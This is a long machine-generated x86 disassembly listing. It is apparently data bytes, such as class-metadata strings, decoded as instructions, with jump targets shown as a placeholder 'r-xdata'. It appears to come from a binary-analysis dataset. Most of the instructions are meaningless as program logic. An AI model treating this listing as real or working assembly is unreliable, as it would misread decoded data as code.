inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
rcr [ eax ] 0x42
inc ebx
imul ebp [ esi + 0x67 ] 0x40112c00
add [ esi + edi + 0x10ac0043 ] bl
inc eax
add [ ebp + 0x41b80040 ] cl
inc ebx
add [ eax ] cl
adc [ esp + edx * 2 + 0x56 ] edx
inc ebp
js r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0xf00433f ] dl
insd
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
nop
aas
inc ebx
add [ edi ] cl
insd
inc ebx
or [ ebx + 0x6f ] al
insd
jae r-xdata
bound ebp [ ecx + ebp * 2 + 0x6e ]
dec edi
inc esp
popad
je r-xdata
insb
outsd
ja r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ecx ] ecx
inc ecx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
imul ebp [ esi + 0x67 ] 0x6e657645
je r-xdata
push ebx
outsb
jb r-xdata
popad
outsb
imul ebp [ fs : esi + 0x67 ] 0x6e657645
je r-xdata
dec esi
outsd
add [ gs : ecx ] eax
push ebx
push es
push ebx
je r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
add [ eax ] al
and [ eax + 0x40 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
push cs
inc ebp
push esp
or al 0x0
imul esp [ edx + 0x6c ] 0x4f676e69
push es
jae r-xdata
inc ebx
add [ esi + edi + 0x10540043 ] bl
inc eax
jb r-xdata
add ecx [ eax ]
push es
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : 0x6f6c6c41 ] ecx
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
insb
jns r-xdata
push esp
js r-xdata
je r-xdata
je r-xdata
inc ebx
add [ eax ] cl
adc dl [ esp + edx * 2 + 0x56 ]
inc ebx
jne r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
cmp al 0x43
inc ebp
jbe r-xdata
dec esi
arpl [ gs : eax + ecx + 0x4 ] si
outsd
insb
insb
popad
jo r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : esi ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
outsd
push es
jae r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
insd
inc esp
jb r-xdata
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x433c0040 ] cl
outsb
je r-xdata
or [ esi ] al
push ebx
outsb
pop es
inc edx
outsd
outsd
insb
popad
arpl [ eax + ecx + 0x4 ] si
dec esi
push 0x65
js r-xdata
je r-xdata
inc edx
outsd
or [ esi + ecx * 2 ] al
push esp
inc ebx
inc esp
jb r-xdata
ja r-xdata
jb r-xdata
add eax 0x65530608
outsb
or [ 0x65646f4e ] al
xor [ ecx ] ecx
push esp
push esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x5 ] si
dec esi
outsd
xor [ gs : ecx ] ecx
or [ 0x65646f4e ] al
popad
outsb
inc ebp
jbe r-xdata
adc [ eax ] eax
pushfd
inc ebx
add [ eax ] al
adc [ eax ] al
mov eax eax
js r-xdata
popad
outsb
jae r-xdata
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
outsd
ja r-xdata
je r-xdata
add al cl
inc edi
inc ebx
add [ esi + edi + 0x2a240043 ] bl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x43a00040 ] cl
inc ebx
add [ eax ] cl
jbe r-xdata
add [ ebx ] al
or [ esi ] al
xor cl [ ecx ]
push esp
push esp
jb r-xdata
dec esi
insd
push esp
jb r-xdata
dec esi
outsd
add [ gs : esp + eax * 2 ] al
popad
je r-xdata
outsd
or [ gs : 0x65646f4e ] al
outsb
je r-xdata
outsd
insd
jo r-xdata
mov esp 0x8004342
andps xmm2 [ esi + edx * 2 + 0x43 ]
add [ eax ] cl
adc [ esp + edx * 2 + 0x56 ] dl
inc ebp
js r-xdata
inc ebx
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ ebx + 0x434278c0 ] cl
add [ eax ] cl
adc dl [ esp + edx * 2 + 0x56 ]
inc ebx
outsd
insb
insb
popad
jo r-xdata
outsd
outsb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ ebx + 0x434218c0 ] cl
push es
adc [ gs : si + 0x43 ] dl
jne r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x52410512
arpl [ gs : ebp + eax + 0x54 ] si
ja r-xdata
inc esp
popa
jne r-xdata
jbe r-xdata
jb r-xdata
insd
outsd
outsd
insb
popad
outsb
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
add [ gs : ebx ] ecx
je r-xdata
add [ eax ] al
adc [ eax ] al
and al 0x44
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
adc al [ 0x63655241 ]
push esp
inc ebx
jne r-xdata
push esp
jb r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x52410512
arpl [ gs : ebp + eax + 0x54 ] si
ja r-xdata
pop es
dec ecx
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
je r-xdata
jb r-xdata
je r-xdata
outsd
add [ gs : 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
je r-xdata
inc ebx
add [ eax ] cl
push ds
inc eax
add [ ebp + 0x44ac0040 ] cl
outsb
je r-xdata
add [ eax ] al
inc esp
sub [ ebx ] eax
add [ eax ] dl
jne r-xdata
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
push esi
imul esp [ ebp + 0x77 ] 0x6f4e0408
push esp
inc ebx
jne r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
push esp
push esp
push esi
inc ecx
jbe r-xdata
add [ esp + eax * 2 + 0x1e080043 ] ch
je r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
je r-xdata
inc ebx
add [ edx + ebp ] ah
insd
inc ebx
add [ eax ] cl
sbb dl [ esp + edx * 2 + 0x56 ]
inc ecx
jbe r-xdata
sub al [ ebx ]
add [ eax ] dl
inc eax
add [ esp + eax * 2 ] ah
insd
outsb
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
inc esp
popa
add [ ebx ] ecx
push edx
arpl [ gs : ecx + eax + 0xb ] si
push esp
je r-xdata
inc ebx
jne r-xdata
je r-xdata
jne r-xdata
je r-xdata
add eax 0x63655241
add eax 0x63655254
je r-xdata
jb r-xdata
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ecx + edx ] ch
inc eax
add [ esi + edi + 0x408d0043 ] bl
add [ edx + eax * 2 + 0xf080043 ] bh
push esp
push esp
push esi
inc ebx
or [ esi + ecx * 2 ] al
push esp
dec edi
popad
outsd
insd
inc esp
jb r-xdata
popad
je r-xdata
ja r-xdata
insd
inc esp
jb r-xdata
adc al [ 0x63655241 ]
push esp
inc ebx
jne r-xdata
ja r-xdata
je r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
je r-xdata
popad
jae r-xdata
je r-xdata
lea eax [ eax ]
lodsb [ esi ]
inc esp
insd
inc esp
outsd
dec esi
outsd
jb r-xdata
jb r-xdata
ja r-xdata
add eax 0x63655254
je r-xdata
je r-xdata
jne r-xdata
jb r-xdata
or eax [ ebp + 0x66 ]
popad
inc ebx
outsd
insd
jo r-xdata
pop es
add [ eax ] al
add [ eax ] al
inc edi
dec esi
outsd
inc ebx
insb
lea eax [ eax ]
jo r-xdata
ja r-xdata
inc ebx
add [ eax + 0x34004347 ] bh
add eax [ eax ]
add al dl
xchg edi eax
inc esp
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
inc edi
je r-xdata
popad
outsb
insb
popad
insd
jb r-xdata
add al 0x4e
jae r-xdata
ja r-xdata
jae r-xdata
add [ 0x67617453 ] al
push esp
ja r-xdata
je r-xdata
adc [ gs : ebx + eax * 2 + 0x75 ] dl
je r-xdata
add eax 0x63655241
arpl [ ebp + eax + 0x54 ] si
inc esp
popa
jne r-xdata
add [ ebx ] ecx
dec esi
or [ esp + edx * 2 + 0x72 ] edx
ja r-xdata
add [ ecx ] ecx
dec esi
outsd
push esp
inc ebx
jne r-xdata
or [ esi ] al
insd
inc esp
jb r-xdata
add [ ebx ] ecx
inc esp
popa
jne r-xdata
inc edx
outsd
outsd
insb
popad
outsb
dec ecx
insd
inc esp
ja r-xdata
jb r-xdata
outsd
add al 0x4e
add eax 0x67617453
insd
inc esp
jb r-xdata
push ebx
je r-xdata
ja r-xdata
jb r-xdata
inc eax
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
inc ebp
dec esi
outsd
inc ebx
insb
popad
jae r-xdata
inc ebx
add [ eax ] cl
pop ss
push esp
inc esp
sub [ ebx ] eax
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] al
je r-xdata
popad
or [ gs : esp + edx * 2 + 0x72 ] edx
push esi
imul esp [ ebp + 0x77 ] 0x6f4e0408
inc ebx
add [ ecx + ebp + 0x43 ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x45700040 ] cl
inc ebx
add [ edx + ebp ] ah
dec esi
add al cl
inc edi
inc ebx
add [ esi + edi + 0x2a240043 ] bl
outsd
or [ esi ] al
push ebx
outsb
jb r-xdata
je r-xdata
add [ gs : 0x67617453 ] al
je r-xdata
jb r-xdata
insd
push esp
jb r-xdata
add al cl
inc edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x43 ] al
add [ eax ] al
adc [ eax ] al
inc edx
mov al 0x43
add [ edx + eax * 8 ] ch
inc ebx
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
push cs
add [ eax ] ch
xor [ eax ] eax
int3
je r-xdata
popad
jae r-xdata
ja r-xdata
push esp
push esp
jb r-xdata
je r-xdata
popad
inc edx
outsd
outsd
insb
popad
outsb
push ebx
outsb
jb r-xdata
or [ esi ] al
outsd
add [ gs : 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
dec esi
je r-xdata
push ss
push esp
push esp
push esi
inc ebx
jne r-xdata
add al cl
inc edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov al [ 0x8004343 ]
inc edx
outsd
outsd
insb
popad
outsb
pop es
dec ecx
outsb
je r-xdata
xor al 0x3
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
outsb
je r-xdata
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ esp ] dl
inc ebx
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
lodsb [ esi ]
mov esp 0xc8c40043
inc esp
add al al
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ eax - 0x6fffbc52 ] dh
aad 0x44
add [ eax ] cl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add ah cl
mov esp 0xf9700043
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ esi + 0x43 ] bh
add [ edi + ecx - 0x585fffbb ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
shr [ ecx + 0x3e300043 ] 0x1
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ ecx + eax * 8 + 0x43 ] bl
add [ eax - 0x1fffbc3f ] bl
mov [ ebx ] 0x38
mov [ ebx ] sub_43beec
or al 0xbf
inc ebx
add [ esi + eax * 8 + 0x43 ] cl
add [ eax - 0x37ffbc35 ] ch
iretd
push eax
adc [ edx ] eax
cmp [ esi ] cl
add al cl
inc edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x434614c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 ] dl
inc ebx
add ah cl
inc edi
inc ebx
add [ eax ] al
inc ebp
je r-xdata
inc edx
outsd
outsd
push esp
jb r-xdata
add [ gs : bp + di ] ecx
jb r-xdata
outsb
outsd
outsb
je r-xdata
insd
inc ebp
jbe r-xdata
jne r-xdata
pop esp
adc [ ebp ] eax
jo r-xdata
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add ah cl
movsd [ edi ] [ esi ]
inc ebx
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
insd
push esp
jb r-xdata
inc ebx
jb r-xdata
je r-xdata
add [ edx ] al
jb r-xdata
jae r-xdata
jae r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
popad
jb r-xdata
add cl [ eax ]
push es
push esp
push esi
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ 0x67617453 ] al
insd
outsb
je r-xdata
insb
popad
jae r-xdata
inc ebx
inc ecx
add al bl
add [ ecx + ebx + 0x310c0045 ] dl
inc ebx
push esi
imul esp [ ebp + 0x77 ] 0x6f4e0901
jbe r-xdata
add [ gs : bp + di ] ecx
push eax
popad
imul ebp [ esi + 0x74 ] 0x67616d49
jae r-xdata
inc ebx
ja r-xdata
outsd
sub al 0x11
inc eax
add [ esi + edi + 0x3e9c0043 ] bl
inc ebx
add [ eax + edx + 0x40 ] dl
sub_43558c
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsb
jb r-xdata
outsd
insd
inc ebx
je r-xdata
je r-xdata
in al dx
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
outsb
or dl [ ebp + edx * 2 + 0x44 ]
inc edx
je r-xdata
insb
add [ ebx ] al
push ebp
inc ebx
add [ esi * 2 + 0x726f4864 ] cl
imul edi [ edx + 0x6f ] 0x6c61746e
or dh [ ebp + 0x64 ]
push esi
jb r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ch
pop es
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
push ebp
inc esp
inc ecx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
nop
mov ah 0x55
inc ebx
add [ ebx ] al
push cs
inc ebp
push esp
jns r-xdata
add [ esi ] al
push esi
inc ebx
add [ gs : ecx + edx ] ch
inc eax
add [ eax ] dh
push esi
inc ebx
add [ ebp + 0x56f00040 ] cl
inc ebx
add [ eax ] cl
adc [ ebp + edx * 2 + 0x44 ] dl
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + edx * 2 + 0x43 ] ah
add [ edi ] al
jne r-xdata
outsb
inc esp
outsd
ja r-xdata
inc ebx
outsd
insb
jae r-xdata
inc esp
dec esp
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jbe r-xdata
je r-xdata
inc ebx
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x6e657645
dec esi
outsd
outsb
add eax 0x55647075
jo r-xdata
add [ ebx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
jb r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
insb
jae r-xdata
insb
imul esp [ edi + 0x6e ] 0x74747542
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x6004355 ] dh
jne r-xdata
inc edx
je r-xdata
shl [ esi + edx * 2 ] 0x43
inc ebx
add [ eax ] cl
or eax 0x43445554
push esp
jns r-xdata
or [ ebx + 0x6f ] al
jne r-xdata
add [ ebx ] ecx
inc ecx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
inc eax
add [ esi + edx * 2 + 0x43 ] ah
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
outsb
inc ebp
add al cl
pop eax
inc ebx
add ah dh
pop eax
inc ebx
add [ eax + 0x2 ] al
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
popad
insb
jne r-xdata
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
jne r-xdata
insb
outsd
ja r-xdata
or eax [ ecx + 0x6c ]
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
adc [ eax ] al
mov eax eax
cmp [ edi + 0x43 ] dl
add [ eax ] cl
adc dl [ ebp + edx * 2 + 0x44 ]
inc ebx
push 0x69676e61
add [ ebx ] al
or dl [ ebp + edx * 2 + 0x44 ]
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
shr [ esi + edx * 2 + 0xd080043 ] 0x54
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
push ebp
inc esp
inc ebx
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
push esi
inc ebx
add [ esi ] al
bound esi [ esi + ecx * 2 + 0x65 ]
js r-xdata
jbe r-xdata
insb
insd
inc ebx
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x6f430874
inc eax
add [ eax + edx ] bh
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] cl
dec esi
ja r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ esp + edx * 8 + 0x43 ] cl
add [ edi + ecx - 0x2b1fffbb ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi ] al
add [ esi ] bh
mov al 0x4e
mov esp 0x5bd14
adc eax 0xb2ffb3bd
call [ edi + edx * 8 + 0x43 ]
add [ eax - 0x29 ] dh
inc ebx
add [ eax - 0x2a ] al
inc ebx
add [ eax ] dl
salc
inc ebx
add [ eax - 0x4bffbc2b ] bh
salc
inc ebx
add [ eax + 0xd0043d7 ] ch
push esp
inc ebx
jne r-xdata
outsb
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
js r-xdata
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x69440900
jb r-xdata
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push es
bound esi [ eax + edx * 2 + 0x72 ]
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
push 0x3004356
inc ebx
add [ ebx + edx * 8 + 0x43 ] ch
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
inc eax
add al dh
push ebp
inc ebx
add [ ebx ] al
push cs
push esp
push ebp
inc esp
dec edi
jb r-xdata
or al 0x31
je r-xdata
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x58 ] 0xda
inc ebx
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x480043d3 ] al
inc esp
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
adc [ eax ] al
cmp al 0x10
sbb [ ebp ] eax
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
arpl [ ecx + ebp * 2 + 0x6f ] si
jae r-xdata
jb r-xdata
jb r-xdata
je r-xdata
outsb
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ esp + edx * 8 + 0x43 ] cl
add [ edi + ecx - 0x2b1fffbb ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi ] al
push esp
push ebp
jo r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
inc ebp
add [ ecx + esi ] cl
insd
push ebp
jo r-xdata
imul ebp [ edi + 0x6e ] sub_43558c
jae r-xdata
outsb
inc edx
jne r-xdata
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5a ] al
inc ebx
add [ eax + 0x2 ] al
add [ eax ] al
mov ah 0x57
inc ebx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
outsd
ja r-xdata
je r-xdata
or al 0x2
dec esp
pop edx
inc ebx
add [ edi ] al
pop es
push esp
push ebp
jo r-xdata
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
sub [ ecx ] dh
inc eax
add [ esp + edi * 8 + 0x44 ] ch
mov eax eax
or [ ecx + 0x43 ] bl
add [ edi ] al
or eax 0x73754354
je r-xdata
push eax
add [ eax ] al
outsb
add al 0x88
inc esp
add [ ecx ] ah
loopne r-xdata
outsd
arpl [ ecx + 0x61 ] bp
je r-xdata
add bh bh
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
outsd
ja r-xdata
add [ eax - 0x75 ] dh
inc ecx
add al dh
insd
push ebp
jo r-xdata
add [ eax ] al
push [ eax - 0xa ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
adc [ edx ] al
add bh bh
add bh bh
clc
xlat
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x20c0044 ] bl
add [ eax - 0x7f010000 ] al
inc ebx
add [ ecx ] al
cmp al 0x10
inc eax
add [ eax ] dl
add al [ eax ]
add [ eax ] dl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4109000d ] al
jae r-xdata
js r-xdata
cmp [ ecx ] dl
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
outsd
ja r-xdata
jb r-xdata
inc ebx
add [ ecx + ebx * 2 ] al
inc ebx
add [ edi ] ah
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
test [ eax + eax + 0x58 ] 0xda
inc ebx
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
add [ eax + 0x43 ] bl
add [ ebx + ebx * 4 + 0xb0044 ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ ecx ] al
adc [ eax ] al
adc al 0x2
add bh bh
jo r-xdata
jmp eax
jns r-xdata
inc eax
add [ eax ] cl
add al [ eax ]
[ eax - 0x23 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ ecx ] cl
inc ecx
jb r-xdata
insb
jae r-xdata
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x480043d3 ] al
inc esp
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
insb
jae r-xdata
add [ edx ] dl
add al [ eax ]
[ eax ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
js r-xdata
add [ fs : eax ] al
add [ ecx ] dl
add [ ebx ] al
dec ebp
popad
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
insb
imul esp [ edi + 0x6e ] 0x74747542
outsd
add [ eax + 0x28004355 ] dh
add al [ eax ]
[ ebx * 8 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax [ eax ]
or eax [ ecx + 0x6c ]
add [ eax + 0x59 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 2 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
jo r-xdata
jb r-xdata
mov eax 0x3800453f
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ecx ] cl
push eax
imul ebp [ esi + 0x74 ] 0x4355ec73
add [ ecx ] ch
add al [ eax ]
[ eax + 0x10043dc ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
test al 0xda
inc ebx
add ah cl
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
call [ eax + 0x40 ]
inc ebp
